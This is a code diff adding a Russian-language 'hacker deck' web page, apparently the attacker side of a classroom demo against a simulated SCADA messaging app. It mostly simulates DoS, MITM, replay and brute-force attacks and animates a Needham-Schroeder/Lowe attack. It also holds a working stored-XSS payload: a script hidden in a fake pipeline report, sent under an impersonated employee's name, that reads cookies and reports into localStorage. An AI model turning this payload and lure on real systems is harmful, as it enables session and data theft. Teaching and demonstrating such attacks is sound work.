@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>💀 HACKER DECK - KDC CRACKER + XSS REPORT</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:#000000;font-family:'Share Tech Mono',monospace;overflow-x:hidden;}
+.cyber-grid{position:fixed;top:0;left:0;width:100%;height:100%;
+  background-image:linear-gradient(rgba(0,255,0,0.08) 1px,transparent 1px),
+  linear-gradient(90deg,rgba(0,255,0,0.08) 1px,transparent 1px);
+  background-size:40px 40px;z-index:-2;animation:gridMove 20s linear infinite;}
+@keyframes gridMove{0%{transform:translate(0,0);}100%{transform:translate(40px,40px);}}
+.matrix-rain{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;opacity:0.25;}
+.scan-line{position:fixed;top:0;left:0;width:100%;height:100%;
+  background:linear-gradient(to bottom,transparent 0%,rgba(0,255,0,0.05) 50%,transparent 100%);
+  animation:scan 8s linear infinite;pointer-events:none;z-index:10;}
+@keyframes scan{0%{transform:translateY(-100%);}100%{transform:translateY(100%);}}
+.container{max-width:1400px;margin:0 auto;padding:20px;position:relative;z-index:1;}
+.glitch{font-family:'Orbitron',monospace;font-size:56px;font-weight:900;color:#00ff00;
+  text-shadow:0 0 20px #00ff00;animation:glitch 3s infinite;letter-spacing:4px;}
+@keyframes glitch{0%,100%,95%{text-shadow:0 0 20px #00ff00;transform:skew(0deg);}
+  96%{text-shadow:3px 0 red,-3px 0 blue;transform:skew(2deg);}
+  97%{text-shadow:-3px 0 red,3px 0 blue;transform:skew(-2deg);}}
+.subglitch{color:#00ff00;opacity:0.7;font-size:14px;letter-spacing:2px;}
+.hack-card{background:rgba(0,15,5,0.85);backdrop-filter:blur(10px);border:1px solid #00ff00;
+  border-radius:20px;padding:25px;margin-bottom:25px;box-shadow:0 0 30px rgba(0,255,0,0.1);
+  transition:0.3s;position:relative;overflow:hidden;}
+.hack-card::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;
+  background:linear-gradient(90deg,transparent,rgba(0,255,0,0.15),transparent);transition:0.5s;}
+.hack-card:hover::before{left:100%;}
+.hack-card:hover{box-shadow:0 0 40px rgba(0,255,0,0.3);border-color:#00ff88;transform:translateY(-2px);}
+.card-title{font-family:'Orbitron',monospace;font-size:18px;color:#00ff00;margin-bottom:20px;
+  border-left:3px solid #00ff00;padding-left:15px;text-transform:uppercase;}
+.cyber-select{width:100%;padding:12px 20px;background:#000000;border:1px solid #00ff00;
+  color:#00ff00;font-family:monospace;font-size:16px;border-radius:10px;cursor:pointer;}
+.cyber-select:hover{box-shadow:0 0 15px rgba(0,255,0,0.3);}
+.btn-group{display:flex;flex-wrap:wrap;gap:15px;margin-top:20px;}
+.cyber-btn{background:transparent;border:2px solid #00ff00;color:#00ff00;padding:12px 28px;
+  font-family:'Orbitron',monospace;font-size:14px;font-weight:bold;cursor:pointer;
+  transition:0.2s;border-radius:40px;position:relative;overflow:hidden;
+  text-transform:uppercase;letter-spacing:1px;}
+.cyber-btn::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;
+  background:linear-gradient(90deg,transparent,rgba(0,255,0,0.3),transparent);transition:0.5s;}
+.cyber-btn:hover::before{left:100%;}
+.cyber-btn:hover{background:#00ff00;color:#000000;box-shadow:0 0 20px #00ff00;transform:scale(1.02);}
+.btn-danger{border-color:#ff3333;color:#ff3333;}
+.btn-danger:hover{background:#ff3333;color:#000000;box-shadow:0 0 20px #ff3333;}
+.btn-warning{border-color:#ffaa00;color:#ffaa00;}
+.btn-warning:hover{background:#ffaa00;color:#000000;}
+.btn-success{border-color:#00ff88;color:#00ff88;}
+.btn-success:hover{background:#00ff88;color:#000000;}
+.btn-blue{border-color:#00ccff;color:#00ccff;}
+.btn-blue:hover{background:#00ccff;color:#000000;}
+.intercepted-container{background:#000a05;border-radius:15px;padding:15px;
+  max-height:350px;overflow-y:auto;margin-top:15px;border:1px solid rgba(0,255,0,0.2);}
+.message-item{background:rgba(0,20,10,0.8);border-left:3px solid #ff3333;padding:12px;
+  margin:10px 0;border-radius:10px;transition:0.2s;}
+.message-item:hover{transform:translateX(5px);border-left-color:#ff6600;}
+.message-header{font-size:11px;color:#888;margin-bottom:8px;display:flex;justify-content:space-between;}
+.message-encrypted{color:#ffaa00;font-family:monospace;font-size:11px;word-break:break-all;
+  background:#000000;padding:8px;border-radius:8px;margin:8px 0;}
+.console{background:#000000;border:1px solid #00ff00;border-radius:15px;padding:20px;
+  height:320px;overflow-y:auto;font-family:'Share Tech Mono',monospace;font-size:12px;}
+.console-line{padding:5px;border-bottom:1px solid rgba(0,255,0,0.1);animation:fadeIn 0.3s ease;}
+@keyframes fadeIn{from{opacity:0;transform:translateX(-10px);}to{opacity:1;transform:translateX(0);}}
+.console-line.success{color:#00ff88;}
+.console-line.fail{color:#ff3333;}
+.console-line.intercept{color:#ffaa00;}
+.console-line.info{color:#00ccff;}
+.console-line.block{color:#ff00ff;}
+.status-bar{display:flex;justify-content:space-between;background:rgba(0,10,5,0.9);
+  border-radius:15px;padding:12px 20px;margin-top:20px;border:1px solid #00ff00;flex-wrap:wrap;gap:10px;}
+.status-item{font-family:monospace;font-size:12px;}
+.status-value{color:#00ff00;font-weight:bold;}
+.blink{animation:blink 1s infinite;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0.5;}}
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:15px;margin-bottom:20px;}
+.stat-card{background:rgba(0,15,5,0.6);border-radius:15px;padding:15px;text-align:center;
+  border:1px solid rgba(0,255,0,0.3);transition:0.2s;}
+.stat-card:hover{border-color:#00ff00;box-shadow:0 0 15px rgba(0,255,0,0.2);}
+.stat-number{font-size:32px;font-weight:bold;color:#00ff00;font-family:'Orbitron',monospace;}
+.stat-label{font-size:11px;opacity:0.7;margin-top:5px;}
+::-webkit-scrollbar{width:6px;}
+::-webkit-scrollbar-track{background:#001a0a;}
+::-webkit-scrollbar-thumb{background:#00ff00;border-radius:3px;}
+.attack-progress{background:#001a0a;border-radius:8px;height:8px;margin:8px 0;overflow:hidden;display:none;}
+.attack-progress-bar{height:100%;background:linear-gradient(90deg,#ff3333,#ff6600);
+  border-radius:8px;width:0%;transition:width 0.1s linear;}
+.ns-steps{background:#000a05;border-radius:12px;padding:15px;margin-top:15px;font-size:12px;}
+.ns-step{padding:8px;margin:4px 0;border-radius:8px;border-left:3px solid #333;opacity:0.4;transition:0.3s;}
+.ns-step.active{opacity:1;border-left-color:#00ff00;background:rgba(0,255,0,0.05);}
+.ns-step.hacked{border-left-color:#ff3333;background:rgba(255,0,0,0.05);}
+.ns-step.blocked{border-left-color:#ff00ff;background:rgba(255,0,255,0.05);}
+.attack-stats-table{width:100%;border-collapse:collapse;font-size:11px;margin-top:10px;}
+.attack-stats-table th{background:#001a0a;color:#00ffcc;padding:8px;text-align:left;border-bottom:1px solid #00ff0040;}
+.attack-stats-table td{padding:6px 8px;border-bottom:1px solid #ffffff08;}
+.report-preview{background:#0a0a0a;padding:15px;margin-top:15px;border-radius:10px;font-size:12px;word-break:break-all;border:1px solid #00ff0040;}
+.stolen-data-box{background:#0a0a0a;padding:15px;margin-top:15px;border-radius:10px;border:1px solid #ff333340;font-family:monospace;font-size:11px;max-height:200px;overflow:auto;}
+</style>
+</head>
+<body>
+<div class="cyber-grid"></div>
+<canvas class="matrix-rain" id="matrixCanvas"></canvas>
+<div class="scan-line"></div>
+
+<div class="container">
+  <div style="text-align:center;margin-bottom:30px;">
+    <div class="glitch">💀 KDC INTERCEPTOR 💀</div>
+    <div class="subglitch">╔════════════════════════════════════════╗</div>
+    <div class="subglitch">║     ПЕРЕХВАТЧИК KDC ТРАФИКА v5.0     ║</div>
+    <div class="subglitch">║        + XSS REPORT ATTACK            ║</div>
+    <div class="subglitch">╚════════════════════════════════════════╝</div>
+  </div>
+
+  <!-- STATS -->
+  <div class="stats-grid">
+    <div class="stat-card"><div class="stat-number" id="interceptCount">0</div><div class="stat-label">ПЕРЕХВАЧЕНО</div></div>
+    <div class="stat-card"><div class="stat-number" id="attackCount">0</div><div class="stat-label">АТАК ЗАПУЩЕНО</div></div>
+    <div class="stat-card"><div class="stat-number" id="blockedCount" style="color:#ff3333;">0</div><div class="stat-label">ЗАБЛОКИРОВАНО</div></div>
+    <div class="stat-card"><div class="stat-number" id="decryptAttempts">0</div><div class="stat-label">ПОПЫТОК ВЗЛОМА</div></div>
+  </div>
+
+  <!-- TARGET -->
+  <div class="hack-card">
+    <div class="card-title">🎯 ВЫБОР ЦЕЛИ</div>
+    <select id="targetRole" class="cyber-select">
+      <option value="ADMIN">🎯 АРУЖАН АМАНОВА (ADMIN) — index.html</option>
+      <option value="OPERATOR">🎯 АХОНОВА АЙГЕРИМ (OPERATOR) — operator.html</option>
+    </select>
+  </div>
+
+  <!-- XSS REPORT ATTACK SECTION -->
+  <div class="hack-card">
+    <div class="card-title">📄 XSS АТАКА ЧЕРЕЗ ОТЧЁТ</div>
+    <div style="font-size:12px;color:#888;margin-bottom:15px;">
+      Маскировка под сотрудника → отправка заражённого отчёта оператору → XSS при открытии админом
+    </div>
+    
+    <div style="margin-bottom:15px;">
+      <div style="color:#0f0;margin-bottom:8px;">🎭 МАСКИРОВКА ПОД СОТРУДНИКА</div>
+      <input id="fakeName" class="cyber-select" style="margin-bottom:8px;" placeholder="Имя 'сотрудника'" value="Азамат Тлеубаев">
+      <input id="fakePosition" class="cyber-select" placeholder="Должность" value="Инженер КИПиА">
+    </div>
+    
+    <div class="btn-group">
+      <button class="cyber-btn btn-danger" onclick="createMaliciousReport()">🔥 СОЗДАТЬ XSS ОТЧЁТ</button>
+      <button class="cyber-btn btn-warning" onclick="sendToOperator()">📨 ОТПРАВИТЬ ОПЕРАТОРУ</button>
+    </div>
+    
+    <div id="reportPreview" class="report-preview" style="display:none;"></div>
+  </div>
+
+  <!-- КРАЖА COOKIES И ДАННЫХ (РЕАЛЬНАЯ) -->
+  <div class="hack-card">
+    <div class="card-title">🍪 ПЕРЕХВАТ COOKIES И ДАННЫХ</div>
+    <div style="font-size:12px;color:#888;margin-bottom:15px;">
+      Здесь появятся реальные украденные данные после того, как админ откроет заражённый отчёт.
+    </div>
+    
+    <button class="cyber-btn btn-success" onclick="fetchStolenData()">🔍 ПОЛУЧИТЬ УКРАДЕННЫЕ ДАННЫЕ</button>
+    <div id="stolenDataDisplay" class="stolen-data-box" style="margin-top:15px;">
+      ⏳ Нажмите "ПОЛУЧИТЬ УКРАДЕННЫЕ ДАННЫЕ" после атаки
+    </div>
+  </div>
+
+  <!-- ATTACKS -->
+  <div class="hack-card">
+    <div class="card-title">💣 АРСЕНАЛ АТАК</div>
+    <div class="attack-progress" id="attackProgress"><div class="attack-progress-bar" id="attackProgressBar"></div></div>
+    <div id="attackStatus" style="font-size:12px;color:#888;margin-bottom:10px;min-height:16px;"></div>
+    <div class="btn-group">
+      <button class="cyber-btn btn-danger" onclick="attack('DoS',this)">💣 DoS АТАКА</button>
+      <button class="cyber-btn btn-danger" onclick="attack('XSS',this)">🔥 XSS ВЗЛОМ</button>
+      <button class="cyber-btn btn-warning" onclick="attack('MITM',this)">🕵️ MITM ПЕРЕХВАТ</button>
+      <button class="cyber-btn" onclick="attack('Replay',this)">🔄 REPLAY АТАКА</button>
+      <button class="cyber-btn btn-blue" onclick="attack('BruteForce',this)">🔑 BRUTE FORCE</button>
+    </div>
+  </div>
+
+  <!-- NS PROTOCOL VISUALIZATION -->
+  <div class="hack-card">
+    <div class="card-title">🔐 ВИЗУАЛИЗАЦИЯ NEEDHAM-SCHROEDER</div>
+    <button class="cyber-btn btn-warning" onclick="attackNS()" style="margin-bottom:15px;">⚔️ АТАКОВАТЬ NS ПРОТОКОЛ</button>
+    <div class="ns-steps" id="nsSteps">
+      <div class="ns-step" id="ns1">Шаг 1: A → KDC: {A, B, Na} — Запрос сессионного ключа</div>
+      <div class="ns-step" id="ns2">Шаг 2: KDC → A: {Na, B, Kab, {Kab,A}Kb} — Выдача ключа</div>
+      <div class="ns-step" id="ns3">Шаг 3: A → B: {Kab, A}Kb — Передача тикета</div>
+      <div class="ns-step" id="ns4">Шаг 4: B → A: {Nb}Kab — Вызов nonce</div>
+      <div class="ns-step" id="ns5">Шаг 5: A → B: {Nb-1}Kab — Подтверждение</div>
+      <div class="ns-step" id="ns6" style="border-left-color:#ff3333;">⚠️ АТАКА ЛОУ: Злоумышленник C перехватывает шаг 3 и выдаёт себя за A</div>
+    </div>
+  </div>
+
+  <!-- INTERCEPT -->
+  <div class="hack-card">
+    <div class="card-title">🔐 ПЕРЕХВАТ KDC СООБЩЕНИЙ</div>
+    <div class="btn-group">
+      <button class="cyber-btn btn-success" onclick="interceptMessages()">📡 ПЕРЕХВАТИТЬ</button>
+      <button class="cyber-btn btn-warning" onclick="tryDecrypt()">🔓 ПОПЫТАТЬСЯ РАСШИФРОВАТЬ</button>
+      <button class="cyber-btn btn-danger" onclick="clearIntercepted()">🗑 ОЧИСТИТЬ</button>
+    </div>
+    <div id="interceptedMessages" class="intercepted-container"><div style="text-align:center;opacity:0.5;padding:40px;">💀 НАЖМИТЕ "ПЕРЕХВАТИТЬ"</div></div>
+  </div>
+
+  <!-- CONSOLE -->
+  <div class="hack-card">
+    <div class="card-title">💻 КОНСОЛЬ ВЗЛОМА</div>
+    <div class="console" id="log">
+      <div class="console-line success">[+] HACKER DECK АКТИВИРОВАН</div>
+      <div class="console-line success">[+] KDC INTERCEPTOR v5.0 ЗАПУЩЕН</div>
+      <div class="console-line info">[*] XSS Report Attack готов</div>
+    </div>
+    <button class="cyber-btn btn-danger" onclick="clearConsole()" style="margin-top:10px;padding:8px 20px;font-size:12px;">🗑 ОЧИСТИТЬ КОНСОЛЬ</button>
+  </div>
+
+  <!-- STATUS BAR -->
+  <div class="status-bar">
+    <div class="status-item">💀 СТАТУС: <span class="status-value blink">ОНЛАЙН</span></div>
+    <div class="status-item">🔐 ЗАЩИТА ЦЕЛИ: <span class="status-value" id="targetDefense">НЕАКТИВНА</span></div>
+    <div class="status-item">🎯 ЦЕЛЬ: SCADA KZ-01 | АЛМАТЫ</div>
+    <div class="status-item">📊 УСПЕШНЫХ: <span class="status-value" id="successRate">0%</span></div>
+  </div>
+</div>
+
+<script>
+// ===== MATRIX RAIN =====
+const canvas=document.getElementById('matrixCanvas');
+const ctx=canvas.getContext('2d');
+canvas.width=window.innerWidth;canvas.height=window.innerHeight;
+const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
+const fontSize=14;
+const columns=canvas.width/fontSize;
+const drops=Array(Math.floor(columns)).fill(1);
+function drawMatrix(){
+  ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);
+  ctx.fillStyle='#00ff00';ctx.font=fontSize+'px monospace';
+  for(let i=0;i<drops.length;i++){
+    const text=chars[Math.floor(Math.random()*chars.length)];
+    ctx.fillText(text,i*fontSize,drops[i]*fontSize);
+    if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;
+    drops[i]++;
+  }
+}
+setInterval(drawMatrix,50);
+window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
+
+// ===== ПЕРЕМЕННЫЕ =====
+let interceptedMessages=[];
+let attackCounter=0,blockedCounter=0,decryptCounter=0;
+let attackHistory=[];
+
+// ===== ЛОГ =====
+function addLog(msg,type='info'){
+  const logDiv=document.getElementById('log');
+  const line=document.createElement('div');
+  line.className=`console-line ${type}`;
+  line.innerHTML=`[${new Date().toLocaleTimeString()}] ${msg}`;
+  logDiv.appendChild(line);
+  line.scrollIntoView({behavior:'smooth',block:'end'});
+}
+function clearConsole(){
+  document.getElementById('log').innerHTML='<div class="console-line info">[*] Консоль очищена</div>';
+}
+
+// ===== ОБНОВЛЕНИЕ ЗАЩИТЫ =====
+function updateDefenseStatus(){
+  const defense=localStorage.getItem('defense')==='ON';
+  const span=document.getElementById('targetDefense');
+  span.innerHTML=defense?'АКТИВНА 🛡️':'НЕАКТИВНА ⚠️';
+  span.style.color=defense?'#00ff88':'#ff3333';
+}
+setInterval(updateDefenseStatus,1000);
+
+// ===== ПОЛУЧЕНИЕ УКРАДЕННЫХ ДАННЫХ (РЕАЛЬНО) =====
+function fetchStolenData(){
+  let stolenCookies = localStorage.getItem('stolen_admin_cookies');
+  let stolenReports = localStorage.getItem('stolen_reports');
+  let displayDiv = document.getElementById('stolenDataDisplay');
+  
+  if(stolenCookies || stolenReports){
+    let html = '<b>🍪 УКРАДЕННЫЕ COOKIES:</b><br>';
+    html += `<code style="font-size:10px;color:#ffaa00;word-break:break-all;">${stolenCookies || '(пусто)'}</code><br><br>`;
+    
+    if(stolenReports){
+      try{
+        let data = JSON.parse(stolenReports);
+        html += '<b>📄 УКРАДЕННЫЕ ОТЧЁТЫ:</b><br>';
+        if(data.reports && data.reports.length>0){
+          data.reports.forEach((r,i)=>{
+            html += `<div style="border-left:2px solid #ff6600;padding:5px;margin:3px 0;font-size:10px;">[${i+1}] ${r.substring(0,150)}...</div>`;
+          });
+        }
+        html += `<br><span style="color:#888;">⏰ Время атаки: ${data.time || 'неизвестно'}</span>`;
+      }catch(e){}
+    }
+    displayDiv.innerHTML = html;
+    addLog(`🍪 УКРАДЕНЫ ДАННЫЕ! Cookies: ${stolenCookies?.substring(0,50)}...`,'success');
+  } else {
+    displayDiv.innerHTML = '⏳ Пока нет украденных данных. Дождитесь, пока админ откроет заражённый отчёт.';
+    addLog('⏳ Нет украденных данных. Админ ещё не открыл отчёт.','info');
+  }
+}
+
+// ===== АВТООБНОВЛЕНИЕ (каждые 2 секунды проверяем) =====
+setInterval(()=>{
+  let stolen = localStorage.getItem('stolen_reports');
+  if(stolen){
+    fetchStolenData();
+  }
+}, 2000);
+
+// ===== ОСТАЛЬНЫЕ ФУНКЦИИ (АТАКИ, ПЕРЕХВАТЫ) =====
+function addHistory(type,result){
+  let tbody=document.getElementById('historyBody');
+  let row=document.createElement('tr');
+  let role=document.getElementById('targetRole').value;
+  row.innerHTML=`<td>${new Date().toLocaleTimeString()}<td><td style="color:${type.includes('XSS')?'#ff6666':type.includes('DoS')?'#ffaa00':'#00ccff'}">${type}</td><td style="color:${result?'#ff3333':'#00ff88'}">${result?'💀 ВЫПОЛНЕНА':'🛡️ ЗАБЛОКИРОВАНА'}</td>`;
+  tbody.insertBefore(row,tbody.firstChild);
+  attackHistory.push({time:new Date().toISOString(),type,role,success:result});
+  updateSuccessRate();
+}
+
+function updateSuccessRate(){
+  if(attackHistory.length===0)return;
+  let successful=attackHistory.filter(a=>a.success).length;
+  let rate=Math.round((successful/attackHistory.length)*100);
+  document.getElementById('successRate').innerText=rate+'%';
+  document.getElementById('successRate').style.color=rate>50?'#ff3333':'#00ff88';
+}
+
+function animateAttack(callback){
+  let prog=document.getElementById('attackProgress');
+  let bar=document.getElementById('attackProgressBar');
+  let status=document.getElementById('attackStatus');
+  prog.style.display='block';
+  bar.style.width='0%';
+  status.innerText='⚡ Атака запускается...';
+  let steps=[{w:'20%',msg:'🔍 Сканирование цели...'},{w:'45%',msg:'💉 Инъекция пакетов...'},{w:'70%',msg:'🎯 Доставка payload...'},{w:'90%',msg:'⏳ Ожидание отклика...'},{w:'100%',msg:'✓ Атака отправлена!'}];
+  let i=0;
+  let interval=setInterval(()=>{
+    if(i>=steps.length){clearInterval(interval);setTimeout(()=>{prog.style.display='none';status.innerText='';callback();},300);return;}
+    bar.style.width=steps[i].w;
+    status.innerText=steps[i].msg;
+    i++;
+  },200);
+}
+
+function attack(type,btn){
+  const defense=localStorage.getItem('defense')==='ON';
+  if(defense&&(type==='XSS'||type==='DoS')){
+    addLog(`🚫 АТАКА ${type} ЗАБЛОКИРОВАНА! Защита активна!`,'block');
+    addHistory(type,false);
+    blockedCounter++;
+    document.getElementById('blockedCount').innerText=blockedCounter;
+    updateSuccessRate();
+    return;
+  }
+  btn.style.opacity='0.5';btn.disabled=true;
+  animateAttack(()=>{
+    btn.style.opacity='1';btn.disabled=false;
+    attackCounter++;
+    document.getElementById('attackCount').innerText=attackCounter;
+    const role=document.getElementById('targetRole').value;
+    const ip=`185.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+    let attacks=JSON.parse(localStorage.getItem('attacks')||'[]');
+    attacks.push(`💀 ${new Date().toLocaleTimeString()} | ${ip} | 🎯 ${role} | 💣 ${type}`);
+    localStorage.setItem('attacks',JSON.stringify(attacks));
+    addLog(`🔥 АТАКА ${type} ОТПРАВЛЕНА В SCADA!`,'success');
+    if(type==='XSS'){addLog(`💀 XSS: данные датчиков будут подменены на 999!`,'success');addHistory(type,true);}
+    else if(type==='DoS'){addLog(`💣 DoS: система будет замедлена на 10 секунд!`,'success');addHistory(type,true);}
+    else if(type==='MITM'){
+      addLog(`🕵️ MITM: попытка перехвата трафика...`,'intercept');
+      setTimeout(()=>{addLog(`🔐 ПРОВАЛ! KDC шифрование защитило данные!`,'fail');addHistory(type,false);blockedCounter++;document.getElementById('blockedCount').innerText=blockedCounter;updateSuccessRate();},2000);
+      return;
+    }else if(type==='Replay'){
+      addLog(`🔄 Replay: повторная отправка пакетов...`,'intercept');
+      setTimeout(()=>{addLog(`🔐 ПРОВАЛ! Nonce уже использован!`,'fail');addHistory(type,false);blockedCounter++;document.getElementById('blockedCount').innerText=blockedCounter;updateSuccessRate();},2000);
+      return;
+    }else if(type==='BruteForce'){
+      addLog(`🔑 BruteForce: подбор пароля...`,'intercept');
+      let tries=0;
+      let bf=setInterval(()=>{tries++;addLog(`🔑 Попытка ${tries}`,'intercept');if(tries>=5){clearInterval(bf);let locked=localStorage.getItem('locked');if(locked){addLog(`🚫 ЗАБЛОКИРОВАН!`,'fail');addHistory(type,false);blockedCounter++;document.getElementById('blockedCount').innerText=blockedCounter;}else{addLog(`⚠️ Система не заблокировала!`,'success');addHistory(type,true);}updateSuccessRate();}},400);
+      return;
+    }
+    updateSuccessRate();
+  });
+}
+
+function attackNS(){
+  addLog('⚔️ АТАКА НА NEEDHAM-SCHROEDER ПРОТОКОЛ','intercept');
+  let steps=['ns1','ns2','ns3','ns4','ns5','ns6'];
+  let messages=['[Шаг 1] A → KDC: Запрос ключа','[Шаг 2] KDC → A: Выдача ключа','[Шаг 3] A → B: Передача тикета — ПЕРЕХВАТ!','[Шаг 4] Хакер → B: Выдаём себя за A!','[Шаг 5] B → Хакер: Nonce','[ВЗЛОМ] Атака Лоу успешна!'];
+  steps.forEach((id,i)=>{setTimeout(()=>{let el=document.getElementById(id);el.classList.add('active');if(i>=3)el.classList.add('hacked');addLog(messages[i],i>=3?'fail':'intercept');if(i===5)addLog('💡 РЕШЕНИЕ: TTL=10сек защищает от этой атаки','success');},i*1200);});
+}
+
+function interceptMessages(){
+  addLog('🔍 Сканирование KDC трафика...','intercept');
+  const allMessages=JSON.parse(localStorage.getItem('scada_messages')||'[]');
+  const container=document.getElementById('interceptedMessages');
+  const countSpan=document.getElementById('interceptCount');
+  if(allMessages.length===0){container.innerHTML='<div style="text-align:center;opacity:0.5;padding:40px;">💀 НЕТ СООБЩЕНИЙ</div>';countSpan.innerText='0';addLog('📭 В системе нет сообщений','fail');return;}
+  interceptedMessages=[...allMessages];
+  container.innerHTML='';
+  allMessages.forEach((msg)=>{container.innerHTML+=`<div class="message-item"><div class="message-header"><span>${msg.from==='aruzhan'?'🧑‍💼 АРУЖАН':'👩‍💼 '+msg.fromName}</span><span>${new Date(msg.timestamp).toLocaleTimeString()}</span></div><div class="message-encrypted">🔐 ${msg.encrypted||'Нет шифрования'}</div><div style="color:#ff3333;font-size:10px;">⚠️ KDC КЛЮЧ НЕИЗВЕСТЕН</div></div>`;});
+  countSpan.innerText=allMessages.length;
+  addLog(`📡 ПЕРЕХВАЧЕНО ${allMessages.length} СООБЩЕНИЙ!`,'intercept');
+}
+function tryDecrypt(){
+  if(interceptedMessages.length===0){addLog('❌ Нет перехваченных сообщений','fail');return;}
+  decryptCounter++;document.getElementById('decryptAttempts').innerText=decryptCounter;
+  addLog(`🔓 ПОПЫТКА ВЗЛОМА KDC #${decryptCounter}...`,'intercept');
+  setTimeout(()=>{addLog('💀 ПРОВАЛ! Нужен KDC ключ!','fail');addLog('🔐 TTL ключа делает атаку сложнее','block');},1500);
+}
+function clearIntercepted(){interceptedMessages=[];document.getElementById('interceptedMessages').innerHTML='<div style="text-align:center;opacity:0.5;padding:40px;">💀 ПЕРЕХВАТ ОЧИЩЕН</div>';document.getElementById('interceptCount').innerText='0';addLog('🗑 Перехват очищен','info');}
+
+// ===== XSS REPORT ATTACK =====
+function createMaliciousReport(){
+  let name = document.getElementById('fakeName').value;
+  let position = document.getElementById('fakePosition').value;
+  
+  // РЕАЛЬНЫЙ XSS ПЭЙЛОАД — КРАДЁТ ДАННЫЕ В localStorage
+  let maliciousScript = `<script>
+    (function(){
+      var c = document.cookie;
+      var msgs = JSON.parse(localStorage.getItem('scada_messages') || '[]');
+      var reports = [];
+      for(var i=0;i<msgs.length;i++){
+        var m = msgs[i];
+        if(m.isReport || m.reportData){
+          reports.push(m.reportData && m.reportData.content ? m.reportData.content : (m.originalText || ''));
+        }
+      }
+      localStorage.setItem('stolen_admin_cookies', c);
+      localStorage.setItem('stolen_reports', JSON.stringify({cookies:c, reports:reports, time:new Date().toISOString()}));
+      console.log('[XSS] ДАННЫЕ УКРАДЕНЫ!');
+    })();
+  <\/script>`;
+  
+  let report = {
+    from: name,
+    position: position,
+    subject: "Ежемесячный отчёт по трубопроводам KZ-01",
+    date: new Date().toLocaleString(),
+    content: `📊 ОТЧЁТ ПО ТРУБОПРОВОДАМ ЗА ${new Date().toLocaleDateString()}\n\n📍 Участок: Алматинская магистраль\n📏 Протяжённость: 47.3 км\n🔍 Состояние: Требуется плановая проверка\n\nАнализ показателей давления: норма. Температурный режим стабилен.\n\nПодпись: ${name}, ${position}`,
+    isMalicious: true,
+    xssPayload: maliciousScript
+  };
+  
+  localStorage.setItem('malicious_report', JSON.stringify(report));
+  
+  let preview = document.getElementById('reportPreview');
+  preview.style.display = 'block';
+  preview.innerHTML = `<div style="color:#0f0;">📄 ОТЧЁТ СОЗДАН (СОДЕРЖИТ XSS)</div>
+    <div>📌 От: ${name} (${position})</div>
+    <div>📅 Дата: ${report.date}</div>
+    <div style="color:#ff4444;margin-top:10px;">⚠️ ВНУТРИ СКРЫТ XSS СКРИПТ!</div>
+    <div style="font-size:10px;color:#888;margin-top:5px;">Payload будет красть cookies и отчёты при открытии</div>`;
+  
+  addLog(`🔥 СОЗДАН ЗАРАЖЁННЫЙ ОТЧЁТ от ${name} (${position})`,'success');
+  addLog(`💀 XSS payload скрыт в теле отчёта`,'intercept');
+}
+
+function sendToOperator(){
+  let report = localStorage.getItem('malicious_report');
+  if(!report){addLog('❌ Сначала создайте отчёт!');return;}
+  
+  let msgs = JSON.parse(localStorage.getItem('scada_messages') || '[]');
+  msgs.push({
+    from: 'hacker',
+    fromName: document.getElementById('fakeName').value,
+    to: 'aigerim',
+    toName: 'Айгерим',
+    encrypted: null,
+    originalText: `📄 ОТЧЁТ ПО ТРУБАМ: ${document.getElementById('fakeName').value} просит проверить отчёт и переслать админу`,
+    reportData: JSON.parse(report),
+    timestamp: new Date().toISOString(),
+    read: false,
+    isReport: true,
+    malicious: true
+  });
+  localStorage.setItem('scada_messages', JSON.stringify(msgs));
+  addLog(`📨 ЗАРАЖЁННЫЙ ОТЧЁТ отправлен оператору Айгерим!`,'success');
+  addLog(`💀 Когда оператор перешлёт отчёт админу, XSS активируется!`,'intercept');
+}
+
+// ===== ИНИТ =====
+addLog('💀 KDC INTERCEPTOR v5.0 ГОТОВ','success');
+addLog('🔐 XSS Report Attack: отчёт крадёт данные при открытии','info');
+addLog('📋 Нажмите "ПОЛУЧИТЬ УКРАДЕННЫЕ ДАННЫЕ" после того, как админ откроет отчёт','info');
+updateDefenseStatus();
+</script>
+</body>
+</html>
